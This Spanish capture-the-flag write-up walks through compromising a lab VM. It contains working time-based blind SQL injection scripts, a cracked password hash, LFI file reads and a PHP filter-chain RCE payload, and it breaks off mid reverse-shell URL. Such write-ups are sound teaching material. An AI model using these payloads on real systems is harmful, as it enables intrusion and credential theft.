- Tags: #Id_rsa_to_convert_public #Time_Daemon
# Writeup Template: Maquina `[ BackToTheFuture ]`

- Tags: #BackToTheFuture
- Dificultad: `[ Media ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
sudo arp-scan -I wlan0 --localnet --ignoredups

192.168.100.35  08:00:27:7f:47:b9       PCS Systemtechnik GmbH
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.35
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.35
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.35 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.35 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p21,22,80,3306 192.168.100.35 -oN targeted
```

**Servicios identificados:**
```bash
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```
---
Lanzamos este script para detectar si esta habilitado el usuario **anonymous** en el servicio **ftp**
```bash
nmap --script ftp-anon.nse -p21 192.168.100.35
```
## Enumeracion de [Servicio Web Principal]
Tenemos **hostDiscovery** asi que agregamos la siguiente linea a nuestro archivo: **(/etc/hosts)**
```bash
192.168.100.35 hillvalley.thl

http://hillvalley.thl/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://hillvalley.thl/
http://hillvalley.thl/ [200 OK] Apache[2.4.62], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.100.35], PasswordField[password], Script, Title[Time Travel Log]
```
### Descubrimiento de Archivos y Rutas
```bash
gobuster dir -u http://hillvalley.thl -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 2948]
/about.php            (Status: 200) [Size: 240]
/img                  (Status: 301) [Size: 314] [--> http://hillvalley.thl/img/]
/admin.php            (Status: 302) [Size: 0] [--> index.php]
/css                  (Status: 301) [Size: 314] [--> http://hillvalley.thl/css/]
/js                   (Status: 301) [Size: 313] [--> http://hillvalley.thl/js/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
/logs.php             (Status: 200) [Size: 216]
/time_machine.php     (Status: 200) [Size: 1121]
```

En la pagina principal tenemos un panel de login del cual no tenemos credenciales, probamos las tipicas
root: root
admin: admin
administrator: administrator

## Explotacion de Vulnerabilidades

Vemos que nada, si probamos colocando una comilla simple en el campo de **username**
```bash
admin'
```

No vemos ningun mensaje de error, pero solo vemos una pagina en blanco
Ahora si interceptamos esta peticion, tenemos lo siguiente
```bash
POST /index.php HTTP/1.1
Host: hillvalley.thl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://hillvalley.thl
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://hillvalley.thl/index.php
Cookie: PHPSESSID=umtmamoshciadsif2c57elhrf2
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&password=admin
```

### Vector de Ataque
Colocamos una comilla simple y reenviamos la peticion para ver como reacciona el servidor
```bash
username=admin'&password=admin
```

El servidor responde con lo siguiente:
```bash
HTTP/1.0 500 Internal Server Error
Date: Fri, 29 Aug 2025 02:07:02 GMT
Server: Apache/2.4.62 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

Ahora si comentamos el resto de la query vemos que funciona
```bash
username=admin'-- -&password=admin
```

Ahora lo que tenemos que es determinar es si es vulnerable a inyecciones basadas en timepo
```bash
admin' or sleep(10)-- -
```

Ahora lo que tenemos que determinar es la longitud del nombre de la base de datos para saber cuantas veces tenemos que iterar en nuestro script en python
Desde la peticion que teniamos interceptada, logramos determinar que la longitud de el nombre de la base de datos es de 10 caracteres
```bash
username=admin' or if(length(database())>=10, sleep(5), 0)-- -&password=admin
```

Ahora determinamos el primer caracter del nombre de la base de datos, **h**
```bash
username=admin' or if(substring(database(),1,1)='h', sleep(5), 0)-- -&password=admin
```

### Ejecucion del Ataque
Una ves que determinamos que es vulnerable a inyecciones basadas en tiempo, Procedemos desarrollar el siguiente script en python para dumpear la base de datos
**sqli.py**
```python
#!/usr/bin/env python3

# Librerias
import sys
import os
import signal
import requests
import string
from termcolor import colored as c 
import time

# Funcioes personalizadas
def ctrl_c(sig, frame):
    print(c(f"\n[!] Saliendo...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Variables globales
characters = string.ascii_letters + string.digits + '_, '
main_url = "http://hillvalley.thl/index.php" # Target

def makeSQL():
    print(c("\n[*] Iniciando Ataque...\n", "green"))
    data = "" # Aqui se almacena la data.

    for position in range(1, 11):
        for character in characters:
            
            time_start = time.time()
            sql_payload = f"admin' or if(substring(database(),{position},1)='{character}', sleep(1), 0)-- -&password=admin"
            r = requests.post(main_url, data={"username": sql_payload, "password": "admin"})
            time_end = time.time()

            if time_end - time_start > 1:
                data += character
                break

    database = (c(f"{data}", "cyan"))
    print(c(f"\n\nDatabase: {database}\n", "green"))

def main():
    makeSQL()

if __name__ == '__main__':
    main()
```

Logrando obtener el nombre de la base de datos:
```bash
[*] Iniciando Ataque...

Database: hillvalley
```

**Nota** Solo tenemos que ir modificando la variable **sql_payload** para ir extrayendo la demas informacion
**Payload** para extraer los nombres de las tablas en la base de datos
```bash
sql_payload = f"admin' or if(substring((select group_concat(table_name) from information_schema.tables where table_schema='hillvalley'),{position},1)='{character}', sleep(5), 0)-- -&password=admin"
```

Ahora tenemos el siguiente resultado:
```bash
[*] Iniciando Ataque...

Tablenames: users
```

Ahora necesitamos saber las columnas para esa tabla **users**
```bash
sql_payload = f"admin' or if(substring((select group_concat(column_name) from information_schema.columns where table_schema='hillvalley' and table_name='users'),{position},1)='{character}', sleep(1), 0)-- -&password=admin"
```

Tenemos el siguiente resultado:
```bash
[*] Iniciando Ataque...

Columns: id,username,password
```

Ahora solo necestiamos extreaer los datos, **username** y **password**, Este es el script final en python para obtener las credenciales:
**Nota** para el valor de la password, Modificamos todo el script para  usar valor en **Decimal**, Ya que en **SQL** por defecto no es sencible a las mayusculas o minusculas
es deicr que: **( A=a -> True )** y para evitar esto, usamos los valores en decimales
```python
#!/usr/bin/env python3

# Librerias
import sys
import os
import signal
import requests
import string
from termcolor import colored as c 
import time

# Funcioes personalizadas
def ctrl_c(sig, frame):
    print(c(f"\n[!] Saliendo...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Variables globales
main_url = "http://hillvalley.thl/index.php" # Target

def makeSQL():
    print(c("\n[*] Iniciando Ataque con comparación ASCII...\n", "green"))
    data = "" # Aqui se almacena la data.

    for position in range(1, 150):  # Rango para el hash completo
        found = False
        # Probamos todos los valores ASCII imprimibles (32-126)
        for ascii_value in range(32, 127):
            
            time_start = time.time()
            # Convertir valor ASCII a carácter para la payload
            character = chr(ascii_value)
            # Payload que compara el código ASCII directamente
            sql_payload = f"admin' or if(ASCII(SUBSTRING((SELECT GROUP_CONCAT(username, ':', password) FROM hillvalley.users),{position},1))={ascii_value}, SLEEP(1), 0)-- -"
            
            try:
                r = requests.post(main_url, data={"username": sql_payload, "password": "admin"}, timeout=2)
            except requests.exceptions.Timeout:
                # Timeout significa que SLEEP(1) se ejecutó → valor ASCII correcto
                char_found = chr(ascii_value)
                data += char_found
                print(c(f"[+] Posición {position}: ASCII {ascii_value} = '{char_found}'", "yellow"))
                found = True
                break
            except Exception as e:
                continue
                
            time_end = time.time()
            elapsed_time = time_end - time_start

            if elapsed_time > 1:
                char_found = chr(ascii_value)
                data += char_found
                print(c(f"[+] Posición {position}: ASCII {ascii_value} = '{char_found}'", "yellow"))
                found = True
                break
        
        if not found:
            print(c(f"[!] No se encontró carácter en posición {position}", "red"))
            break

    print(c(f"\n[+] Datos extraídos: {data}", "green"))
    print(c(f"[+] Longitud: {len(data)} caracteres", "blue"))

def main():
    makeSQL()

if __name__ == '__main__':
    main()
```

Tenemos las credenciales de un usuario:
```bash
[+] Datos extraídos: marty:$2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy                                                                                                                                                                                       
[+] Longitud: 66 caracteres
```

Ahora el valor del hash lo guardamos en un archivo:
```bash
echo '$2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy' > hash.txt
```

Procedemos a realizar fuerza bruta:
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Tenemos el siguiente resultado:
```bash
# Sabemos que tenemos usuario: marty
Press 'q' or Ctrl-C to abort, almost any other key for status
andromeda        (?)
```

Ahora sabemos que tenemos un login, y tambien esta expuesto **ssh** y tambien **mysql** en el puerto 3306, Por lo que intentaremos usar esas credenciales para ganar acceso
ingresamos las credenciales en la web
```bash
username: marty
password: andromeda
```

Tenemos acceso al panel administrativo:
```bash
http://hillvalley.thl/admin.php
```

Ahora que ganamos acceso tenemos esta seccion:
```bash
http://hillvalley.thl/admin.php?page=time_machine.php
```

por lo que con **wfuzz** probaremos si es vulnerable a **LFI**
```bash
wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -H "Cookie: PHPSESSID=0l72l6bse5ncn96eare69nvoue" -u "http://hillvalley.thl/admin.php?page=FUZZ" --hh=5755
```

Tenemos varias formas de derivar a **LFI**, Pirmero intentaremos traernos el archivo **config.php** para ver su contenido en **base64**
```bash
http://hillvalley.thl/admin.php?page=php://filter/convert.base64-encode/resource=config.php
```

Ahora tenemos esta cadena en base64
```bash
PD9waHANCiRob3N0ID0gImxvY2FsaG9zdCI7DQokdXNlciA9ICJtYXJ0eSI7DQokcGFzcyA9ICJ0MW0zdHJhdmVsIjsNCiRkYiA9ICJoaWxsdmFsbGV5IjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkaG9zdCwgJHVzZXIsICRwYXNzLCAkZGIpOw0KaWYgKCEkY29ubikgew0KICAgIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCj8
```

Si guardamos en un archivo decodificando con el siguiente comando
```bash
echo -n "PD9waHANCiRob3N0ID0gImxvY2FsaG9zdCI7DQokdXNlciA9ICJtYXJ0eSI7DQokcGFzcyA9ICJ0MW0zdHJhdmVsIjsNCiRkYiA9ICJoaWxsdmFsbGV5IjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkaG9zdCwgJHVzZXIsICRwYXNzLCAkZGIpOw0KaWYgKCEkY29ubikgew0KICAgIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCj8" | base64 -d > config.php
```

Ahora para ver el contendio ejecutamos el siguiente comando:
```bash
cat config.php -l php
```

Tenemos el siguiente codigo con credenciales que probaremos si son validas por **ssh**
```php
<?php
$host = "localhost";
$user = "marty";
$pass = "t1m3travel";
$db = "hillvalley";

$conn = mysqli_connect($host, $user, $pass, $db);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
```

Probando esas credenciales no son validas por **ssh**
Ahora usaremos la siguiente herramienta para ejecucion de comandos con **php** [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator.git)
```bash
git clone https://github.com/synacktiv/php_filter_chain_generator.git --depth=1
```

Generamos la siguiente instruccion
```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]) ?>'
```

Tenemos el siguiente **payloda**
```bash
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

El cual nos falta agregar el parametro **cmd** ya desde la **url** para que logremos ejecutar codigo
```bash
# Ejecutado desde la url
http://hillvalley.thl/admin.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=id
```

Logramos **RCE**
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$)C�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@
```
### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
http://hillvalley.thl/admin.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.